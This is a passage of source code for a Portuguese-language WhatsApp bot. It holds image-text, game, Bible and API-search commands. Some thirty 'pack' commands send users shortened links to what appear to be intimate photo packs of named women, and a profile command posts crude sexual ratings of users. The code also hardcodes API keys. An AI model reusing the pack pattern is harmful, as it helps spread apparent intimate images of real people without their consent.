venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis9.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=50%25&text.0.size=68&text.0.color=ffffff&text.0.opacity=61&text.0.font.family=Tangerine&text.0.font.style=italic&text.0.background.opacity=61&text.0.outline.color=ff6f00&text.0.outline.width=9`)
nezuko.sendMessage(from, { image: venomk }, { quoted: sasah })
break

case 'indian':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis10.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=62%25&text.0.size=63&text.0.color=004124&text.0.opacity=99&text.0.font.family=Permanent%20Marker&text.0.font.style=italic&text.0.background.color=feff00&text.0.outline.color=ffe8a3&text.0.outline.width=9&text.0.outline.blur=21`)
nezuko.sendMessage(from, { image: venomk }, { quoted: sasah })
break 

case 'ffrose':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis12.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=65%25&text.0.size=61&text.0.color=ff00e6&text.0.opacity=32&text.0.font.family=Chewy&text.0.font.style=italic&text.0.outline.width=6`)
nezuko.sendMessage(from, { image: venomk }, { quoted: sasah })
break	

case 'ffgren':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis13.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=63%25&text.0.size=68&text.0.color=ffffff&text.0.opacity=92&text.0.font.family=Permanent%20Marker&text.0.font.weight=800&text.0.outline.color=5dff00&text.0.outline.width=13&text.0.outline.blur=21`)
nezuko.sendMessage(from, { image: venomk }, { quoted: sasah })
break		

case 'chufuyu':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis14.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=68%25&text.0.size=60&text.0.color=ffffff&text.0.font.family=Sigmar%20One&text.0.font.style=italic&text.0.background.opacity=17&text.0.outline.color=a99cff&text.0.outline.width=9&text.0.outline.blur=16`)
nezuko.sendMessage(from, { image: venomk }, { quoted: sasah })
break	

case 'wolf':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis15.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=62%25&text.0.size=63&text.0.color=000000&text.0.font.family=Audiowide&text.0.font.style=italic&text.0.background.opacity=15&text.0.outline.color=ffffff&text.0.outline.width=9&text.0.outline.blur=33`)
nezuko.sendMessage(from, { image: venomk }, { quoted: sasah })
break	

case 'dragonred':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis16.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=58%25&text.0.size=99&text.0.color=fffefe&text.0.font.family=Permanent%20Marker&text.0.background.color=000000&text.0.outline.color=000000&text.0.outline.width=19&text.0.outline.blur=66`)
nezuko.sendMessage(from, { image: venomk }, { quoted: sasah })
break	

case 'purple':              
if (args.length < 1) return reply('cade o texto?')
teks = `${body.slice(8)}`
if (teks.length > 10) return nezuko.sendMessage(from, 'Teksnya kepanjangan Bambank', text, {quoted: sasah})
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://docs-jojo.herokuapp.com/api/text3d?text=${teks}`, {method: 'get'})
nezuko.sendMessage(from, { image: venomk }, {quoted: sasah, caption: `${teks}`})			     	
break

case 'avatar':  
try {
textin = args.join(" ")
txt1 = textin.split("/")[0];
txt2 = textin.split("/")[1];
if(!textin) return reply("Cade o texto?")
if(!textin.includes("/")) return reply(`Cade a / precisa dela para a separação..\nExemplo: ${prefix + command} Game/Play`)
reply(enviar.espere)
bla = await fetchJson(`https://nezsab-apis.xyz/api/mascoteavatar?texto=${txt1}&texto2=${txt2}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado.imageUrl)
nezuko.sendMessage(from, {image: blabla}, {quoted: m}).catch(rs =>{
reply("ERROR!!")  
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'gpwhatsapp':
case 'gruposwhats':
case 'gruposwa':
if(!q) return reply("Cadê o título da pesquisa?")
axios.get(`https://ayu.p7api.xyz/api/pesquisa/gpwhatsapp?nome=${q}&apikey=saladakk`)
.then(e => {
try{
d = e.data;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `✓ 🏷 𝘕𝘰𝘮𝘦⧽ ${i.nome}\n× 🈹 𝘋𝘦𝘴𝘤𝘳𝘪𝘤̧𝘢̃𝘰⧽ ${i.descrição}\n× 🔗 𝘓𝘪𝘯𝘬⧽ ${i.link}\n\n`;
}
nezuko.sendMessage(from, {image:{url: `${logo}`}, caption:txt})
}catch(err){
reply(`Nenhum resultado foi encontrado.`)
}
}).catch(err => {
reply('Ops, eu acho que a api ou módulo caiu!')
console.log(err);
});
break

case 'ephemeral': {

addFilter(from)  

if (!isGroup) return reply(enviar.msg.grupo)
if (!isBotAdmins) return reply(mess.only.botadm)

if (!text) return reply(`Insira os valores de ativação/desativação`)

if (args[0] === 'ativar') {

reply(`<❗> Mensagem temporária ativada com sucesso`)

await nezuko.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })

} else if (args[0] === 'desativar') {

reply(`<❗> Mensagem temporária desativada com sucesso`)

await nezuko.sendMessage(m.chat, { disappearingMessagesInChat: false })

}

}

break

case 'anagrama':
if(!isGroup) return reply('comando apenas para grupos')
const anaaleatorio = Math.floor(Math.random() * palavrasANA.length)
if(!isGroupAdmins) return reply('<❗> comando apenas para admins')
if(args.length == 0) return reply('use 1 para ativar o jogo do anagrama\npara desativar use anagrama 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./funções de cmd/anagrama-${from}.json`)) {
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./funções de cmd/anagrama-${from}.json`))
reply(`o jogo já foi iniciado neste grupo:
palavra: ${dataAnagrama2.embaralhada}
dica: ${dataAnagrama2.dica}
`)} else {
fs.writeFileSync(`./funções de cmd/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
nezuko.sendMessage(from, {text: `
╭─────≽「 [⚙️] 𝙰𝙽𝙰𝙶𝚁𝙰𝙼𝙰 [⚙️] 」
│➽ 𝙳𝙴𝚂𝙲𝚄𝙱𝚁𝙰 𝙰 𝙿𝙰𝙻𝙰𝚅𝚁𝙰
│➽ 𝙰𝙽𝙰𝙶𝚁𝙰𝙼𝙰: ${palavrasANA[anaaleatorio].embaralhada}
│➽ 𝙳𝙸𝙲𝙰: ${palavrasANA[anaaleatorio].dica}
╰────────────────────────
`})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./funções de cmd/anagrama-${from}.json`)) return reply('não tem como desativar o jogo do anagrama pôs ele não foi ativado')
fs.unlinkSync(`./funções de cmd/anagrama-${from}.json`)
reply("desativado com sucesso")
}
await limitAdd(sender)
break

case 'perfil':
try {
ppimg = await nezuko.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://telegra.ph/file/6659f0fb9a747b7dbaaaf.jpg'
}

var conselho = palavras[Math.floor(Math.random() * palavras.length)]
const nivelgado = ['1','2','3','4','5','6','7','8','9']
const nivelgado2 = ['1','2','3','4','5','6','7','8','9'] 
const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))] 
const puta = ['1','2','3','4','5','6','7','8','9']
const puta2 = ['1','2','3','4','5','6','7','8','9'] 
const putar = puta[Math.floor(Math.random() * (puta.length))]
const putar2 = puta2[Math.floor(Math.random() * (puta2.length))] 
const gostosura = ['1','2','3','4','5','6','7','8','9']
const gostosura2 = ['1','2','3','4','5','6','7','8','9'] 
const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))] 
gadop = `${Math.floor(Math.random() * 100)}`
const programa = Math.ceil(Math.random() * 10000)
const dptr = `    「 🗣𝐈𝐍𝐅𝐎 𝐃𝐎 𝐏𝐄𝐑𝐅𝐈𝐋🔥 」

🥷🏻 Seu nome: ${pushname}
🪀 Número: wa.me/${sender.split("@")[0]}
🐂 Nível de Chifres: ${nivelgador}${nivelgado2r}%
📱 Seu dispositivo logado é: ${m.key.id.length > 21 ? 'Android 🌀' : m.key.id.substring(0, 2) == '3A' ? 'iPhone ☔' : 'Whatsapp Web 🪀'}
😈 Nível de safado(a): ${putar}${putar2}%
😋 Nível de gostosura: ${gostosurar}${gostosurar2}%
🍼 Valor do progama: R$${programa}

➻ ~*_CONSELHO:_*~
${conselho}`
daftarimg = await getBuffer(ppimg)
nezuko.sendMessage(from, {image: daftarimg, caption: dptr}, {quoted: dnselo})
break

case 'conselhobiblico':
case 'conselhosbiblico':  
case 'conselhosb':   
case 'conselhob':  
var conselhosb = conselhob[Math.floor(Math.random() * conselhob.length)]   
jr = `${tempo} ${pushname} 

Conselhos Bíblicos para você: 

- ${conselhosb} 

> Bot: 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿
> Grupo: ${groupName}`
await nezuko.sendMessage(from, {text: jr}, {quoted:dnselo, contextInfo: {"mentionedJid": jr}})
break

case 'biblia':
            case 'bíblia':
                if (!text) return reply(`Insira o capítulo da bíblia ex: João 4`)
                await reply(`Aguarde....`)
                try {
                    apiuu = await fetchJson(encodeURI(`https://bible-api.com/${text}?translation=almeida`))
                    if (apiuu?.reference === undefined) return reply(`Insira o capítulo da bíblia válido ex: João 4`)
                    let textuu = `*${apiuu.reference}*\n\n`
                    textuu += apiuu.text
                    reply(textuu)
                } catch {
                    reply('Erro ao achar capítulo')
                }
                break


case 'forestfaye':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/forestfaye.jpeg`)
txt = `*Pack da ForestFayee* _(Google Fotos)_\n\nhttps://bit.ly/2ZmIwGi`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break

case 'leticia_shirayuki':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/leticia.jpeg`)
txt = `*Pack da Leticia Shirayuki* _(Google Fotos)_\n\nhttps://bit.ly/3vOJsPZ`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'jenniie':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/jennie.jpeg`)
txt = `*Pack da Jenniie__s* _(Google Fotos)_\n\nhttps://bit.ly/3EkmYts`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'alinefaria':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/alinefaria.jpeg`)
txt = `*Pack da Aline Faria* _(Google Fotos)_\n\nhttps://bit.ly/3GqaUZd`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'honey69':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/honey.jpeg`)
txt = `*Pack da oh_honey69* _(Google Fotos)_\n\nhttps://bit.ly/3CjMzCa`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'cclowniac':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/cclowniac.jpeg`)
txt = `*Pack da Cclowniac* _(Google Fotos)_\n\nhttps://bit.ly/3mmeonT`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'sethi':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/ms.sethi.jpeg`)
txt = `*Pack da ms.sethi* _(Google Fotos)_\n\nhttps://bit.ly/3GqQtM2`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'raychiel':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/raychiel.jpeg`)
txt = `*Pack da Raychiel* _(Google Fotos)_\n\nhttps://bit.ly/3BaxgtT`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'lais':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/lais.jpeg`)
txt = `*Pack da Lais Rodrigues* _(Google Fotos)_\n\nhttps://bit.ly/3jF5Oyu`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'alinefox':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/alinefox.jpeg`)
txt = `*Pack da Aline Fox* _(Google Fotos)_\n\nhttps://bit.ly/3b8EnZm`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'beatrzz':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/beatrzzfonseca.jpeg`)
txt = `*Pack da Beatrzzfonseca* _(Google Fotos)_\n\nhttps://bit.ly/3CjOCGm`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'bunni':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/bunni3png.jpeg`)
txt = `*Pack da bunni3png* _(Google Fotos)_\n\nhttps://bit.ly/3mfl7j7`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'nivnixxi':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/nivnixxi.jpeg`)
txt = `*Pack da nivnixxi* _(Google Fotos)_\n\nhttps://bit.ly/3En1j3P`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'angela':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Angela.jpeg`)
txt = `*Pack da Angela Halee* _(Google Fotos)_\n\nhttps://bit.ly/30QIgQH`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'callmesloo':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/callmesloo.jpeg`)
txt = `*Pack da callmesloo* _(Google Fotos)_\n\nhttps://bit.ly/3vJ5mEq`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'hannahowo':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Hannahowo.jpeg`)
txt = `*Pack da Hannahowo* _(Google Fotos)_\n\nhttps://bit.ly/3mb8xS6`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'me1adinha':

reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Me1adinha.jpeg`)
txt = `*Pack da Me1adinha* _(Google Fotos)_\n\nhttps://bit.ly/2ZyzfLP`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'cogumay':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Cogumay.jpeg`)
txt = `*Pack da Cogumay* _(Google Fotos)_\n\nhttps://bit.ly/3GkVzsV`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'fabiola_mendoza':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Fabiola_mendoza.jpeg`)
txt = `*Pack da Fabiola mendoza* _(Google Fotos)_\n\nhttps://bit.ly/3BcLY3D`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'missbrasilia':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/missbrasilia.jpeg`)
txt = `*Pack da missbrasilia* _(Google Fotos)_\n\nhttps://bit.ly/3BdE2iv`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'fegalvao':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Fegalvao.jpeg`)
txt = `*Pack da Fegalvao* _(Google Fotos)_\n\nhttps://bit.ly/3jEZwPv`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'vitacelestine':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/VitaCelestine.jpeg`)
txt = `*Pack da Vita Celestine* _(Google Fotos)_\n\nhttps://bit.ly/316KeNf`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'belledelphine':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Belledelphine.jpeg`)
txt = `*Pack da Belle delphine* _(Google Fotos)_\n\nhttps://bit.ly/3pAKY7p`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'mayakayagaia':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/mayakayagaia.jpeg`)
txt = `*Pack da mayakayagaia* _(Google Fotos)_\n\nhttps://bit.ly/3CfKiI3`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'kittykum':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/KittyKum.jpeg`)
txt = `*Pack da Kitty x Kum* _(Google Fotos)_\n\nhttps://bit.ly/3ClliiA`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'mackenzie':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Mackenzie.jpeg`)
txt = `*Pack da Mackenzie* _(Google Fotos)_\n\nhttps://bit.ly/3GmKDLt`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'fulltimecrybaby':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/fulltimecrybaby.jpeg`)
txt = `*Pack da fulltimecrybaby* _(Google Fotos)_\n\nhttps://bit.ly/3pDkOB1`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'dracuina':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/dracuina.jpeg`)
txt = `*Pack da dracuina* _(Google Fotos)_\n\nhttps://bit.ly/3meqOhl`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'saekkico':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Saekkico.jpeg`)
txt = `*Pack da Saekkico* _(Google Fotos)_\n\nhttps://bit.ly/3GpuWDa`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'lynienicole':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/lynienicole.jpeg`)
txt = `*Pack da lynienicole* _(Google Fotos)_\n\nhttps://bit.ly/3meosz2`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'powrice':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Powrice.jpeg`)
txt = `*Pack da Powrice* _(Google Fotos)_\n\https://bit.ly/3mdkoin`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'wendy666':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Wendy666.jpeg`)
txt = `*Pack da Wendy666* _(Google Fotos)_\n\https://bit.ly/3Ei84DP`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'ShiroKitsune':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/ShiroKitsune.jpeg`)
txt = `*Pack da Shiro Kitsune* _(Google Fotos)_\n\https://bit.ly/3pFtIxM`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'moonfox':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/moonfox.jpeg`)
txt = `*Pack da moonfox* _(Google Fotos)_\n\https://bit.ly/3Cfypli`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'love_lilah':
reply('<❗> Enviando no seu pv, aguarde...')  
buffer = fs.readFileSync(`funções de cmd/imgs/packs/Love_Lilah.jpeg`)
txt = `*Pack da Love Lilah* _(Google Fotos)_\n\https://bit.ly/3mh8og8`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break
case 'mcmirella':
reply('<❗> Enviando no seu pv, aguarde...') 
buffer = fs.readFileSync(`funções de cmd/imgs/packs/mcmirella.jpeg`)
txt = `*Pack da mcmirella* _(Google Fotos)_\n\https://bit.ly/3GhgmxH`
await nezuko.sendMessage(sender, {
    image: buffer,
    quoted: info,
    caption: txt
})
break

case 'joga-pedra': case 'jogar': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) reply(`Complete seu terno anterior`)
if (m.mentionedJid[0] === sender) return reply(`Não brincar com eu  !`)
if (!m.mentionedJid[0]) return reply(`_Quem você quer desafiar?_\nTag a pessoa..\n\nExemplo : ${prefix}suit @5521964523665`)
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return reply(`A pessoa que você desafiou está jogando um jogo com outra pessoa :(`)
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} Desafiador @${m.mentionedJid[0].split`@`[0]} para jogar o jogo

Por favor @${m.mentionedJid[0].split`@`[0]} para digitar aceitar/rejeitar`
this.suit[id] = {
chat: await nezuko.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) nezuko.sendText(from, `_O tempo do jogo acabou._`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break

case 'nick':
case 'gerarnick':
case 'fazernick':
try {
nick = args.join(' ')
if(!nick) return reply('Escreva o Nick ou nome que você quer personalizar.')
axios.get(`https://lz-screapers.herokuapp.com/fazernick?nome=${nick}`)
.then(dados => {
var emoji = `🎯`
nicks = dados.data.nicks
txt2 = '🔥 Nicks Gerados Com Sucesso! 🔥\n\n'
for (let i = 0; i < nicks.length; i++) {
txt2 += `${emoji} ${nicks[i]}\n`
}
txt2 += `
𝘾𝙤𝙥𝙮𝙧𝙞𝙜𝙝𝙩 𝙗𝙮 Nezuko-MD`
reply(`${txt2.trim()}`)
}).catch(e => {
reply('Não pode incluir letras modificadas nem emojis, ou pode ser que a api caiu, mas volta logo logo...')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar") 
console.log(e)
} else {
reply('ERROR!!')
}
}
break

case 'happymod2':
if(!q) return reply("Cadê o título da pesquisa?")
axios.get(`https://lzmods-api.tk/api/pesquisar/happymod?q=${q}&apikey=Fbv44cNSG6IKLlz7VVKhNRnRm`)
.then(e => {
try{
d = e.data.resultado;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `✓ 🏷️ 𝘕𝘰𝘮𝘦⧽ ${i.title}\n× 🔗 𝘓𝘪𝘯𝘬⧽ ${i.link}\n× ⭐ Avaliação⧽ ${i.rating}\n\n`;
}
nezuko.sendMessage(from, {image:{url: `${logo}`}, caption:txt})
}catch(err){
reply(`Nenhum resultado foi encontrado.`)
}
}).catch(err => {
reply('Ops, eu acho que a api ou módulo caiu!')
console.log(err);
});
break

case 'apkmody':
if(!q) return reply("Cadê o título da pesquisa?")
axios.get(`https://luffy-md-api-v3.herokuapp.com/api/api/apkmody?q=${q}&apikey=key-yoshi-2.0`)
.then(e => {
try{
d = e.data.resultado;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `✓ 🏷️ 𝘕𝘰𝘮𝘦⧽ ${i.nome}\n× ⭐ Descrição⧽ ${i.descrição}\n× 🔗 link⧽ https:/${i.link}\n\n`;
}
nezuko.sendMessage(from, {image:{url: `${logo}`}, caption:txt})
}catch(err){
reply(`Nenhum resultado foi encontrado.`)
}
}).catch(err => {
reply('Ops, eu acho que a api ou módulo caiu!')
console.log(err);
});
break

case 'filmeapi':
if(!q) return reply("Cadê o título da pesquisa?")
axios.get(`https://luffy-md-api-v3.herokuapp.com/api/api/filme?q=${q}&apikey=key-yoshi-2.0`)
.then(e => {
try{
d = e.data.resultado;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `✓ 🏷️ 𝘕𝘰𝘮𝘦⧽ ${i.titulo}\n× ⭐ Sinopse⧽ ${i.sinopse}\n× 🔗 link⧽ ${i.link}\n\n`;
}
nezuko.sendMessage(from, {image:{url: `${logo}`}, caption:txt})
}catch(err){
reply(`Nenhum resultado foi encontrado.`)
}
}).catch(err => {
reply('Ops, eu acho que a api ou módulo caiu!')
console.log(err);
});
break

case 'nerding':
if(!q) return reply("Cadê o título da pesquisa?")
axios.get(`https://luffy-md-api-v3.herokuapp.com/api/api/nerding?q=${q}&apikey=key-yoshi-2.0`)
.then(e => {
try{
d = e.data.resultado;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `✓ 🔥️ Titulo⧽ ${i.titulo}\n× ⭐ Descrição⧽ ${i.descrição}\n× 🌀 Review⧽ ${i.review}\n× 🔗 link⧽ ${i.link}\n\n`;
}
nezuko.sendMessage(from, {image:{url: `${logo}`}, caption:txt})
}catch(err){
reply(`Nenhum resultado foi encontrado.`)
}
}).catch(err => {
reply('Ops, eu acho que a api ou módulo caiu!')
console.log(err);
});
break

case 'wikipedia2':
if(!q) return reply("Cadê o título da pesquisa?")
axios.get(`https://luffy-md-api-v3.herokuapp.com/api/api/wikipedia?q=${q}&apikey=key-yoshi-2.0`)
.then(e => {
try{
d = e.data.resultado;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `✓ 🔥️ Titulo⧽ ${i.titulo}\n\n× ⭐ Descrição⧽ ${i.descrição}\n\n× 🌀 Resultado⧽ ${i.resultado}\n\n× 🔗 link⧽ ${i.link}\n\n`;
}
nezuko.sendMessage(from, {image:{url: `${logo}`}, caption:txt})
}catch(err){
reply(`Nenhum resultado foi encontrado.`)
}
}).catch(err => {
reply('Ops, eu acho que a api ou módulo caiu!')
console.log(err);
});
break

case 'petrobras':
                    send = await fetchJson(`https://lz-screapers.herokuapp.com/petrobrasInfo`)
                    teks = `✔️ INFO PETROBRAS
🔱 Preço Medio: ${send.resultado.Preço_Medio}
⭐ Distribuição Revenda: ${send.resultado.Distribuiçao_Revenda}
☕ Etanol Anidro ${send.resultado.Etanol_Anidro}
🔥 Imposto Estadual: ${send.resultado.Imposto_Estadual}
🎯 Impostos Federais ${send.resultado.Impostos_Federais}
🌺 Parcela Petrobras ${send.resultado.Parcela_Petrobras}`
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break                   

case 'gprandom': {
                    send = await fetchJson(`https://lzmods-api.tk/api/tools/gruposdezap?apikey=Fbv44cNSG6IKLlz7VVKhNRnRm`)
teks = `🍷 GP RANDOM 🍷

Nome: ${send.resultado.nome}
Link: ${send.resultado.link}
Descrição: ${send.resultado.descrição}
`                    
                    
let buttonss = [
                    {buttonId: `${prefix}gprandom`, buttonText: {displayText: '🔥 PRÓXIMO GRUPO 🔥'}, type: 1}]
                let bb = {
                    text: `🎯 ${teks} 🎯`,
                    footer: '© Copyright by Nezuko-MD',
